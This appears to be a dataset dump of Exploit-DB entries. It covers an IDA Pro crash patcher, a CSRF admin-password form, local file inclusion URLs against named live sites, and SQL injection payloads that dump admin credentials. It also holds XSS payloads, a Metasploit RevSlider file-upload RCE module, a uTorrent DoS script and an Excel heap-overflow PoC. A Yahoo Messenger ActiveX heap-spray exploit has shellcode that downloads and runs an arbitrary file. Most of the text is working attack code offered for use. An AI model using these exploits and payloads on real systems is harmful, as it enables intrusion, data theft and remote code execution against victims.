23524,"IDA Pro 6.3 - Crash (PoC) /* * * IDA Pro 6.3 (crash due an internal error) * ELF anti-debugging/reversing patcher * * Published @ IOActive Labs Research blog: * http://blog.ioactive.com/2012/12/striking-back-gdb-and-ida-debuggers.html * * - nitr0us [ http://twitter.com/nitr0usmx ] * * Tested under: * IDA Pro Starter License 6.3.120531 (Mac OS X) * IDA Pro Demo            6.3.120730 (Ubuntu Linux 9.04) * IDA Pro Demo            6.3.120730 (Mac OS X 10.7.3) * IDA Pro Demo            6.3.120730 (Windows Vista Home Premium SP2) * * Bug found using Frixyon fuzzer (my ELF file format fuzzer still in develo= pment) * * Timeline: * 21/11/2012    The bug was found on IDA Demo 6.3 * 22/11/2012    The bug was tested on IDA Pro Starter License 6.3.120531 (3= 2-bit) * 22/11/2012    The bug was reported through the official Hex-Rays contact = emails * 23/11/2012    Hex-Rays replied and agreed that the bug leads to an unreco= verable *               state and it will be fixed on the next release * **************** TECHNICAL DETAILS *********************** nitr0us@burial:~$ gdb -q idaq (gdb) r a.out (no debugging symbols found)  Program received signal SIGTRAP, Trace/breakpoint trap. [Switching to Thread 0xb6860760 (LWP 3638)] 0xb55f7694 in default_notification_handler (reader=@0xbfbffae0,     notif=reader_t::err_shstrndx) at reader.cpp:33 33      reader.cpp: No such file or directory.         in reader.cpp Current language:  auto; currently c++ (gdb)  The root cause of the problem is that there's no validation to verify if e_shstrndx > e_shnum before referencing it.  ********************************************************** * * [Compilation] $ gcc ida_63_elf_shield.c -o ida_63_elf_shield -Wall * * Sh0utz: IOActive fellows, CRAc, b33rc0n crew (dex, hkm, calderpwn, *         Carlos Ayala, Daemon [Thanks for test it on IDA paid $$$],=20 *         LightOS) chr1x, alt3kx, tr3w, crypkey, el_chito, nahual, beck,=20 *         sirdarkcat, NataS, ran, Fede Bossi, nediam, psymera, Rolman,=20 *         Kbrown, Bucio, p4dm3, Hector Lopez, zeus, Matias Brutti, *         sunl3vy, Raaka_elgaupo, vendetta, raito, beavis, el5patas,=20 *         vi0let. * * * http://chatsubo-labs.blogspot.com * http://www.brainoverflow.org * */  #include <sys/mman.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <stdio.h> #include <fcntl.h> #include <time.h>  #define EI_NIDENT       16 #define ELFCLASS32      1               /* 32-bit objects */ #define ELFDATA2LSB     1               /* 2's complement, little endian */  const char e_magic[4] = { 0x7f, 'E', 'L', 'F' };  typedef uint16_t Elf32_Half; typedef uint32_t Elf32_Word; typedef uint32_t Elf32_Addr; typedef uint32_t Elf32_Off;  typedef struct {   unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */   Elf32_Half    e_type;                 /* Object file type */   Elf32_Half    e_machine;              /* Architecture */   Elf32_Word    e_version;              /* Object file version */   Elf32_Addr    e_entry;                /* Entry point virtual address */   Elf32_Off     e_phoff;                /* Program header table file offset=  */   Elf32_Off     e_shoff;                /* Section header table file offset=  */   Elf32_Word    e_flags;                /* Processor-specific flags */   Elf32_Half    e_ehsize;               /* ELF header size in bytes */   Elf32_Half    e_phentsize;            /* Program header table entry size = */   Elf32_Half    e_phnum;                /* Program header table entry count=  */   Elf32_Half    e_shentsize;            /* Section header table entry size = */   Elf32_Half    e_shnum;                /* Section header table entry count=  */   Elf32_Half    e_shstrndx;             /* Section header string table inde= x */ } Elf32_Ehdr;  int isELF(int fd);  int main(int argc, char **argv) { Elf32_Ehdr*header; Elf32_Halfnew_shnum; Elf32_Halfnew_shstrndx; intfd;  printf(""######################################################\n""); printf(""#                                                    #\n""); printf(""# IDA Pro 6.3 - ELF anti-debugging/reversing patcher #\n""); printf(""#                      -nitr0us-                     #\n""); printf(""#                                                    #\n""); printf(""######################################################\n\n"");  if(argc < 2){ fprintf(stderr, ""Usage: %s <elf_file_to_patch>\n"", argv[0]); exit(-1); }  if((fd = open(argv[1], O_RDWR)) == -1){ perror(""open""); exit(-1); }  if(!isELF(fd)){ close(fd); exit(-1); }  // Mapping to memory only the necessary bytes [sizeof(header)] if((header = (Elf32_Ehdr *) mmap(NULL, sizeof(header), PROT_READ | PRO= T_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){ perror(""mmap""); close(fd); exit(-1); }  printf(""[*] The ELF file originally has:\n""); printf(""[-] Ehdr->e_shnum:    %5d (0x%.4x)\n"", header->e_shnum, header->= e_shnum); printf(""[-] Ehdr->e_shstrndx: %5d (0x%.4x)\n\n"", header->e_shstrndx, hea= der->e_shstrndx);  printf(""[*] Patching \""%s\"" with new random() values...\n\n"", argv[1]);  srand(time(NULL)); // seed for rand()  new_shnum    = (Elf32_Half) rand() % 0x1337; new_shstrndx = (Elf32_Half) 0;  while(new_shstrndx < new_shnum) new_shstrndx = (Elf32_Half) rand() % 0xDEAD;  header->e_shnum    = new_shnum; header->e_shstrndx = new_shstrndx;  // Synchronize the ELF in file system with the previous memory mapped if(msync(NULL, 0, MS_SYNC) == -1){ perror(""msync""); close(fd); exit(-1); }  close(fd); munmap(header, 0);  printf(""[*] The patched ELF file now has:\n""); printf(""[+] Ehdr->e_shnum:    %5d (0x%.4x)\n"", new_shnum, new_shnum); printf(""[+] Ehdr->e_shstrndx: %5d (0x%.4x)\n\n"", new_shstrndx, new_shstr= ndx);  printf(""[*] IDA Pro 6.3 should crash trying to load \""%s\""\n"", argv[1]);  return 0; }  int isELF(int fd) { Elf32_Ehdrheader;  if(read(fd, &header, sizeof(header)) == -1){ perror(""isELF(): read""); return 0; }  /* magic number verification */ if(memcmp(header.e_ident, e_magic, 4) != 0){ fprintf(stderr, ""The argument given is not an ELF file !\n""); return 0; }  /* 32-bit class verification */ if(header.e_ident[4] != ELFCLASS32){ fprintf(stderr, ""Only 32-bit ELF files supported !\n""); return 0; }  /* little-endian verification */ if(header.e_ident[5] != ELFDATA2LSB){ fprintf(stderr, ""Only little-endian ELF files supported !\n""); return 0; }  return 1; }",IDA Pro Demo,1
11284,"PHP Product Catalog - Cross-Site Request Forgery (Change Administrator Password)                 ______     __     ______                /\  == \   /\ \   /\  __ \                \ \  __<   \ \ \  \ \ \/\ \                 \ \_____\  \ \_\  \ \_____\                  \/_____/   \/_/   \/_____/                   01000010 01101001 01001111  [#]----------------------------------------------------------------[#] # # [+] PHP Product Catalog - [ CSRF ] Change Administrator Password # #  // Author Info # [x] Author: bi0 # [x] Contact: bukibv@hotmail.com # [x] Thanks: Pig,packetdeath,redking,sp1r1t and all my friends # [x] IRC : irc.clickshqip.com / #itsecurity # [#]-------------------------------------------------------------------------------------------[#] # # [x] Exploit : # # [ CSRF ] # #     [ Login ] #     http://[server]/[path]/admin.php # # // Start CSRF |-------------------------------------------------------------------------------|  <html> <form action=""http://[server]/admin.php?p=otherConfig&amp;sOption=save"" method=""POST""> Admin : <input type=""text"" name=""login"" value=""admin"" size=""5"" /><br> Passwd  <input type=""text"" name=""pass"" value=""123"" size=""5"" /><br> Email : <input type=""text"" name=""email"" value=""test@example.com"" size=""16"" /><br> <input type=""submit"" name=""save"" value=""Save""> </form> </html>  |-------------------------------------------------------------------------------| # // End of attack # [#]------------------------------------------------------------------------------------------[#]  #EOF",PHP Product Catalog,1
6980,Joomla! Component ProDesk 1.0/1.2 - Local File Inclusion [~]------------------------------------------------------------------------------------------------------- [~] Joomla Component ProDesk v 1.0 AND 1.2 (com_pro_desk&include_file) Local File Inclusion Vulnerability [~] [~] http://joomlashowroom.com/index.php/Pro-Desk-Support-Center/Pro-Desk-Support-Center.html [~]   [~]  [~] ---------------------------------------------------------------------------------------------------- [~] Bug founded by d3v1l [Avram Marius] [~] [~] Date: 4.11.2008 [~] [~] [~] d3v1l@spoofer.com http://security-sh3ll.com [~] [~] ----------------------------------------------------------------------------------------------------- [~] Greetz tO ALL:- [~] [~] Security-Shell Members ( http://security-sh3ll.com/forum.php ) [~] [~] milw0rm staff [~]------------------------------------------------------------------------------------------------------ [~] Exploit :- [~] [~] http://site.com/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd [~]   [~] Ex :- v 1.2 [~] [~] http://www.reviewyou.com.au/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd [~]------------------------------------------------------------------------------------------------------- [~]  [~] Ex :- v1.0  [~]   [~] http://www.ppcmanagement.com/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd  [~]---------------------------------------------------------------------------------------------------------  # milw0rm.com [2008-11-04],Joomla! Component ProDesk,1
41253,"ThisIsWhyImBroke Clone Script 4.0 - 'id' SQL Injection # # # # #  # Exploit Title: Flippy AffilatePlatform – ThisIsWhyImBroke Clone Script v4.0 - SQL Injection # Google Dork: N/A # Date: 06.02.2017 # Vendor Homepage: https://www.flippyscripts.com/ # Software Buy: https://www.flippyscripts.com/flippy-affilateplatform-affilate-site-builder-script/ # Demo: http://ap.flippydemos.com/ # Version: 4.0 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[beygir]ihsan[nokta]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/listing.php?id=[SQL] -21+/*!50000union*/+select+1,version(),3,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),5,6,7,8,9,10,11,12,14,15,16,17 # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/listing.php?id=[SQL] # Etc... # -9999+/*!50000union*/+select+1,concat_ws(0x3a,adminuser,0x3a,adminpassword),3,0x494853414e2053454e43414e3c62723e7777772e696873616e2e6e6574,5,6,7,8,9,10,11,12,13,14,15,16+from+admin-- # # # # #",ThisIsWhyImBroke Clone Script,1
35606,"MIT Kerberos 5 - kadmind Change Password Feature Remote Code Execution source: https://www.securityfocus.com/bid/47310/info  MIT Kerberos is prone to a remote code-execution vulnerability in 'kadmind'.  An attacker may exploit this issue to execute arbitrary code with superuser privileges. Failed attempts will cause the affected application to crash, denying service to legitimate users. A successful exploit will completely compromise affected computers.  MIT Kerberos 5 1.7 and later are vulnerable.  NOTE (April 13, 2011): This BID was originally titled 'MIT Kerberos kadmind Version String Processing Remote Denial Of Service Vulnerability', but has been renamed to better reflect the nature of the issue.   # nmap -n -sV krb01",MIT Kerberos,1
30378,"Webbler CMS 3.1.3 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/25040/info  The 'webbler' is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  These issues affect webbler 3.1.3; prior versions may also be affected.   http://www.example.com/uploader/?page=<script>alert(document.cookie)</script>  curl -s ""http://target-domain.com/uploader/?"" -d ""login=\""><script>alert(\""XSS\"")</SCRIPT>&password=test&processlogin=Enter&forgotpassword=""",Webbler CMS,1
36957,"WordPress Plugin RevSlider 3.0.95 - Arbitrary File Upload / Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::HTTP::Wordpress   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'Wordpress RevSlider File Upload and Execute Vulnerability',       'Description'    => %q{         This module exploits an arbitrary PHP code upload in the WordPress ThemePunch         Revolution Slider ( revslider ) plugin, version 3.0.95 and prior. The         vulnerability allows for arbitrary file upload and remote code execution.       },       'Author'         =>         [           'Simo Ben youssef', # Vulnerability discovery           'Tom Sellers <tom[at]fadedcode.net>'  # Metasploit module         ],       'License'        => MSF_LICENSE,       'References'     =>         [           ['URL', 'https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/'],           ['EDB', '35385'],           ['WPVDB', '7954'],           ['OSVDB', '115118']         ],       'Privileged'     => false,       'Platform'       => 'php',       'Arch'           => ARCH_PHP,       'Targets'        => [['ThemePunch Revolution Slider (revslider) 3.0.95', {}]],       'DisclosureDate' => 'Nov 26 2015',       'DefaultTarget'  => 0)     )   end    def check     release_log_url = normalize_uri(wordpress_url_plugins, 'revslider', 'release_log.txt')     check_version_from_custom_file(release_log_url, /^\s*(?:version)\s*(\d{1,2}\.\d{1,2}(?:\.\d{1,2})?).*$/mi, '3.0.96')   end    def exploit     php_pagename = rand_text_alpha(4 + rand(4)) + '.php'      # Build the zip     payload_zip = Rex::Zip::Archive.new     # If the filename in the zip is revslider.php it will be automatically     # executed but it will break the plugin and sometimes WordPress     payload_zip.add_file('revslider/' + php_pagename, payload.encoded)      # Build the POST body     data = Rex::MIME::Message.new     data.add_part('revslider_ajax_action', nil, nil, 'form-data; name=""action""')     data.add_part('update_plugin', nil, nil, 'form-data; name=""client_action""')     data.add_part(payload_zip.pack, 'application/x-zip-compressed', 'binary', ""form-data; name=\""update_file\""; filename=\""revslider.zip\"""")     post_data = data.to_s      res = send_request_cgi(       'uri'     => wordpress_url_admin_ajax,       'method'  => 'POST',       'ctype'   => ""multipart/form-data; boundary=#{data.bound}"",       'data'    => post_data     )      if res       if res.code == 200 && res.body =~ /Update in progress/         # The payload itself almost never deleted, try anyway         register_files_for_cleanup(php_pagename)         # This normally works         register_files_for_cleanup('../revslider.zip')         final_uri = normalize_uri(wordpress_url_plugins, 'revslider', 'temp', 'update_extract', 'revslider', php_pagename)         print_good(""#{peer} - Our payload is at: #{final_uri}"")         print_status(""#{peer} - Calling payload..."")         send_request_cgi(           'uri'     => normalize_uri(final_uri),           'timeout' => 5         )       elsif res.code == 200 && res.body =~ /^0$/         # admin-ajax.php returns 0 if the 'action' 'revslider_ajax_action' is unknown         fail_with(Failure::NotVulnerable, ""#{peer} - Target not vulnerable or the plugin is deactivated"")       else         fail_with(Failure::UnexpectedReply, ""#{peer} - Unable to deploy payload, server returned #{res.code}"")       end     else       fail_with(Failure::Unknown, 'ERROR')     end    end end",WordPress ThemePunch Revolution,1
35946,"Chyrp 2.x - '/includes/lib/gz.php?File' Traversal Arbitrary File Access source: https://www.securityfocus.com/bid/48672/info     Chyrp is prone to multiple cross-site scripting vulnerabilities, a local file-include vulnerability, an arbitrary file-upload vulnerability, and a directory-traversal vulnerability.     An attacker may leverage these issues to execute arbitrary script code on an affected computer and in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, open or run arbitrary files in the context of the webserver process, and gain access to sensitive information.     Chyrp 2.1 is vulnerable; other versions may also be affected.   http://www.example.com/includes/lib/gz.php?file=/themes/../../../../../../../../../etc/passwd",Chyrp,1
33460,Reamday Enterprises Magic News Plus 1.0.2 - Cross-Site Scripting source: https://www.securityfocus.com/bid/37566/info  Magic News Plus is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Magic News Plus 1.0.2 is vulnerable; other versions may also be affected.   http://www.example.com/index.php/>[xss],Reamday Enterprises Magic News Plus,1
25858,"DUware DUportal 3.4.3 Pro - Multiple SQL Injections source: https://www.securityfocus.com/bid/14029/info  DUportal Pro is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  Some of these issues may have previously been discussed in BID 13285 and BID 13288.   http://www.example.com/DUportalPro34/Articles/default.asp?iChannel=2[SQL Inject]&nChannel=Articles http://www.example.com/DUportalPro34/Articles/detail.asp?iData=4[SQL Inject]&iCat=292&iChannel=2&nChannel=Articles http://www.example.com/DUportalPro34/home/members.asp?iMem=[SQL Inject] http://www.example.com/DUportalPro34/topics/cat.asp?iCat=4[SQL Inject]&iChannel=16&nChannel=Topics http://www.example.com/DUportalPro34/Polls/default.asp?iChannel=15[SQL Inject]&nChannel=Polls http://www.example.com/DUportalPro34/home/members.asp?iMem=[SQL Inject] http://www.example.com/DUportalPro34/admin/members_listing_approval.asp?offset=[SQL Inject] http://www.example.com/DUportalPro34/admin/channels_edit.asp?iChannel=7[SQL inject]&nChannel=[Name Module]",DUware DUportal,1
3193,"Microsoft Excel - Malformed Palette Record Denial of Service (PoC) (MS07-002) """""" MS07-002 EXCEL Malformed Palette Record Vulnerability DOS POC  ###### Author ###### LifeAsaGeek at gmail.com ... and Microsoft said that vuln credit is for Greg MacManus of iDefense Labs  ######################## Vulnerablity Description ######################## Bound error occurs when parsing Palette Record and it causes Heap Overflow check out here - http://picasaweb.google.com/lifeasageek/MS07002/photo?pli=1#5022146178204021506    which is generated by DarunGrim    ( and I want to say I'm not a person who made this analyzer ==; )  ############# Attack Vector ############# Arbitary Data will be overwritten to the heap, but arbitary data is highly depends on the stack status ! Result of heap overflow, you can overwrite 2 bytes to restricted range address ( not anywhere ) In *CERTAIN* environment( such as open excel file which is already opened)     you can catch the flow by modify function pointer, but it doesn't have a reliablity at all Let me know if you have a good method to break down  ###### Result ###### DOS  ##### Notes ##### You should modify pyExcelerator module because it doesn't generate Palette Record  pyExcelerator diff results would be like below  diff h:\study\pyexcelerator-0.6.3a\pyExcelerator-0.6.3a\build\lib\pyExcelerator\BIFFRecords.py pyExcelerator\BIFFRecords.py 1104a1105,1108 >     def __init__(self): >         BiffRecord.__init__(self) >         self._rec_data = pack('<H', 0x0038) # number of colours >         self._rec_data += 'A' * 0xe0 diff h:\study\pyexcelerator-0.6.3a\pyExcelerator-0.6.3a\build\lib\pyExcelerator\Workbook.py pyExcelerator\Workbook.py 468,469c468 <         result = '' <         return result --- >         return BIFFRecords.PaletteRecord().get()  !! THIS IS ONLY FOR EDUCATIONAL PURPOSE !!  - 2007.01.25 """"""  import sys, os from struct import * from pyExcelerator import *  def CreateXLS():     w = Workbook()     ws = w.add_sheet('MS07-002 POC')     w.save( ""before.xls"")   def ModifyXLS():     try:         f = open( ""before.xls"", ""rb"")     except:      print ""File Open Error ! ""      sys.exit(0)      str = f.read()     f.close()      #write to malformed xls file     f = open( ""after.xls"", ""wb"")      PaletteRecord = pack( ""<HHH"", 0x0092, 0x00E2, 0x0038)     NewPaletteRecord = pack( ""<HHH"", 0x0092, 0x00E2, 0x01FF)      palette_idx = str.find( PaletteRecord)      if palette_idx == -1:      print ""Cannot find Palette Record""      sys.exit(0)      str = str.replace( PaletteRecord, NewPaletteRecord)     f.write( str)     f.close()  if __name__ == ""__main__"":     print ""===========================================================""     print ""MS07-002 Malformed Palette Record vulnerability DOS POC ""     print ""Create POC Excel File after.xls""     print ""by LifeAsaGeek at gmail.com""     print ""===========================================================""     CreateXLS()     ModifyXLS()   # milw0rm.com [2007-01-25]",Microsoft Excel,1
12010,"μTorrent (uTorrent) WebUI 0.370 - Authorisation Header Denial of Service #!/usr/bin/perl # Exploit Title: uTorrent WebUI <= v0.370 Authorization header DoS Exploit # Date: 2010-04-01 # Author: zombiefx darkernet[at]gmail.com<http://gmail.com> # Version: µTorrent 2.0 (build 18488) / WebUI <=v0.370 # Tested on: Windows XP SP3 #Code: # lame usage: ./UTweb.pl <IP> <PORT> # EAX 00000000 ECX 00000000 EDX 00000001 EBX 003D8360 ASCII ""admin"" ESP 0141FE94 # EBP 0141FF08 ESI 00000000 EDI 01511958 EIP 0041BC62 uTorrent.0041BC62 # Good luck! corelanc0d3r  use warnings; use strict; use IO::Socket; my $nonbase64 = ""\x41"" x 1000; # That was pointless my $sock = IO::Socket::INET->new(PeerAddr =>$ARGV[0],PeerPort =>$ARGV[1],Proto => 'tcp'); print $sock ""GET / HTTP/1.1\r\n"". ""Authorization: Basic $nonbase64\r\n\r\n"";",μTorrent (uTorrent) WebUI,1
4053,"Yahoo! Messenger Webcam 8.1 - 'Ywcupl.dll' Download / Execute /*    Compile in LCC-win32 (Free!)   Download and exec any file you like!   Have Fun!   */   #include <stdio.h> #include <string.h> #include <stdlib.h> char *file = ""Click_here.html""; FILE *fp = NULL;     unsigned char sc[] = ""\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"" ""\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"" ""\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"" ""\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"" ""\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"" ""\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"" ""\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"" ""\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"" ""\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"" ""\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"" ""\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"" ""\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"" ""\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF"";        char *url = NULL; unsigned char sc_2[] = ""\x00\x98"";    char * header = ""<html>\n"" ""<object classid=\""clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277\"" id='viewme'></object>\n"" ""<body>\n"" ""<SCRIPT language=\""javascript\"">\n"" ""var shellcode = unescape(\""%u9090%u9090%u9090%u9090\"" + \n"";   char * footer = ""\n\n"" ""bigblock = unescape(\""%u9090%u9090\"");\n"" ""headersize = 20;\n"" ""slackspace = headersize+shellcode.length;\n"" ""while (bigblock.length<slackspace) bigblock+=bigblock;\n"" ""fillblock = bigblock.substring(0, slackspace);\n"" ""block = bigblock.substring(0, bigblock.length-slackspace);\n"" ""while(block.length+slackspace<0x40000) block = block+block+fillblock;\n"" ""memory = new Array();\n"" ""for (x=0; x<500; x++) memory[x] = block + shellcode;\n"" ""var buffer = '\\x0a';\n"" ""while (buffer.length < 5000) buffer+='\\x0a\\x0a\\x0a\\x0a';\n"" ""viewme.server = buffer;\n"" ""viewme.initialize();\n"" ""viewme.send();\n"";    char * trigger_1 = ""</script>\n"" ""</body>\n"" ""</html>\n"";    // print unicode shellcode void PrintPayLoad(char *lpBuff, int buffsize) { int i; for(i=0;i<buffsize;i+=2) { if((i%16)==0) { if(i!=0) { printf(""\""\n\""""); fprintf(fp, ""%s"", ""\"" +\n\""""); } else { printf(""\""""); fprintf(fp, ""%s"", ""\""""); } }   printf(""%%u%0.4x"",((unsigned short*)lpBuff)[i/2]);   fprintf(fp, ""%%u%0.4x"",((unsigned short*)lpBuff)[i/2]); }   printf(""\"";\n""); fprintf(fp, ""%s"", ""\"");\n"");    fflush(fp); }        void main(int argc, char **argv) { unsigned char buf[1024] = {0};   int sc_len = 0; int n;    if (argc < 2) {  printf(""\r\nYahoo 0day Ywcupl.dll ActiveX Exploit Download And Exec\n"");  printf(""link:http://research.eeye.com/html/advisories/upcoming/20070605.html\n"");  printf(""link:http://www.informationweek.com/news/showArticle.jhtml?articleID=199901856 \n"");  printf(""link:http://secunia.com/advisories/25547/\n"");  printf(""greetz to Jambalaya for helping with this code\n"");  printf(""\r\nUsage: %s <URL> [htmlfile]\n"", argv[0]);  printf(""\r\nE.g.: %s http://www.malwarehere.com/rootkit.exe exploit.html\r\n\n"", argv[0]);  printf(""=-Excepti0n-=\n""); exit(1); }   url = argv[1];    if( (!strstr(url, ""http://"") && !strstr(url, ""ftp://"")) || strlen(url) < 10) { printf(""[-] Invalid url. Must start with 'http://','ftp://'\n""); return; }   printf(""[+] download url:%s\n"", url);   if(argc >=3) file = argv[2]; printf(""[+] exploit file:%s\n"", file);   fp = fopen(file, ""w""); if(!fp) { printf(""[-] Open file error!\n""); return; }    //build Exploit HTML File fprintf(fp, ""%s"", header); fflush(fp);   memset(buf, 0, sizeof(buf)); sc_len = sizeof(sc)-1; memcpy(buf, sc, sc_len); memcpy(buf+sc_len, url, strlen(url));   sc_len += strlen(url);   memcpy(buf+sc_len, sc_2, 1); sc_len += 1;   PrintPayLoad((char *)buf, sc_len);   fprintf(fp, ""%s"", footer); fflush(fp);   fprintf(fp, ""%s"", trigger_1); fflush(fp);    printf(""[+] exploit write to %s success!\n"", file); }  // =-Excepti0n-=   // milw0rm.com [2007-06-08]",Yahoo! Messenger Webcam,1
27054,427BB 2.2 - Authentication Bypass source: https://www.securityfocus.com/bid/16178/info  427BB is prone to an authentication bypass vulnerability. This issue is due to a failure in the application to properly validate user-supplied data.  An attacker can exploit this issue to bypass the authentication mechanism and gain access to the affected application as an administrative user. This may facilitate a compromise of the underlying system; other attacks are also possible.  This issue affects version 2.2 and 2.2.1; other versions may also be vulnerable.   The following demonstrates cookie-data sufficient to exploit this issue: username=admin; authenticated=1; usertype=admin;,427BB,1
24808,"Microsoft Internet Explorer 6 - Search Pane URI Obfuscation source: https://www.securityfocus.com/bid/11851/info  A remote URI obfuscation vulnerability has been found in Internet Explorer's search pane functionality. This issue is due to a failure of the application to present the URI address of HTML and script code loaded into the search pane.  This issue may be leveraged by an attacker to display misleading information in the address bar of the browser to an unsuspecting user while loading a third party Web site in the search pane. This may allow an attacker to present web pages to users that seem to originate from a trusted location. This may facilitate phishing style attacks; other attacks may also be possible.  <form id=""foo"" action=""res://C:\WINDOWS\system32\shdoclc.dll/dnserror.htm#http://login.passport.net/uilogin.srf?id=malware.is.here"" method=""post""><   <input type=""submit"" value=""default value""> </form>  <a id=""fee"" href=""hotfemail.html"" target=""_search"">test</a>  <script>  var malware = screen.availHeight; window.moveTo(0, 0); window.resizeTo(500, malware); fee.click() // setTimeout(""fee.click();"",1);  setTimeout(""foo.submit();"",1);   </script>",Microsoft Internet Explorer,1
25389,"Multiple Vendor ICMP Message Handling - Denial of Service source: https://www.securityfocus.com/bid/13124/info    Multiple vendor implementations of TCP/IP Internet Control Message Protocol (ICMP) are reported prone to several denial-of-service attacks.    ICMP is employed by network nodes to determine certain automatic actions to take based on network failures reported by an ICMP message.    Reportedly, the RFC doesn't recommend security checks for ICMP error messages. As long as an ICMP message contains a valid source and destination IP address and port pair, it will be accepted for an associated connection.    The following individual attacks are reported:    - A blind connection-reset attack. This attack takes advantage of the specification that describes that on receiving a 'hard' ICMP error, the corresponding connection should be aborted. The Mitre ID CAN-2004-0790 is assigned to this issue.    A remote attacker may exploit this issue to terminate target TCP connections and deny service for legitimate users.    - An ICMP Source Quench attack. This attack takes advantage of the specification that a host must react to receive ICMP Source Quench messages by slowing transmission on the associated connection. The Mitre ID CAN-2004-0791 is assigned to this issue.    A remote attacker may exploit this issue to degrade the performance of TCP connections and partially deny service for legitimate users.    - An attack against ICMP PMTUD is reported to affect multiple vendors when they are configured to employ PMTUD. By sending a suitable forged ICMP message to a target host, an attacker may reduce the MTU for a given connection. The Mitre ID CAN-2004-1060 is assigned to this issue.    A remote attacker may exploit this issue to degrade the performance of TCP connections and partially deny service for legitimate users.    **Update: Microsoft platforms are also reported prone to these issues.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25389.tar.gz",Multiple Vendor ICMP Message Handling,0
32807,"Joomla! / Mambo Component gigCalendar 1.0 - 'banddetails.php' SQL Injection source: https://www.securityfocus.com/bid/33859/info  The gigCalendar component for Joomla! and Mambo is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  gigCalendar 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/path/index.php?option=com_gigcal&task=details&gigcal_bands_id=-1' UNION ALL SELECT 1,2,3,4,5,concat('username: ', username),concat('password: ', password),NULL,NULL,NULL,NULL,NULL,NULL from jos_users%23",Mambo Component gigCalendar,1
45855,"Rmedia SMS 1.0 - SQL Injection # Exploit Title: Rmedia SMS 1.0 - SQL Injection # Dork: N/A # Date: 2018-11-11 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://sms.rmediaindia.com/ # Software Link: https://master.dl.sourceforge.net/project/rmediasms/rmedia_sms.rar # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/editgrp.php?gid=[SQL] #  GET /[PATH]/editgrp.php?gid=1%27%20AnD%20EXTRactvaLUE(156,CONcat((selECT+GrouP_conCAT(scHEma_NAme+SEparaTOR+0x3c62723e)+frOM+INFOrmaTION_ScheMA.SCHEmatA),(SelecT%20(Elt(156=156,1))),0x496873616e2053656e63616e))--%20Efe HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=31hgqp31e2ten1gk8gousnt0d3 Connection: keep-alive HTTP/1.1 200 OK Date: Sun, 11 Nov 2018 20:04:34 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 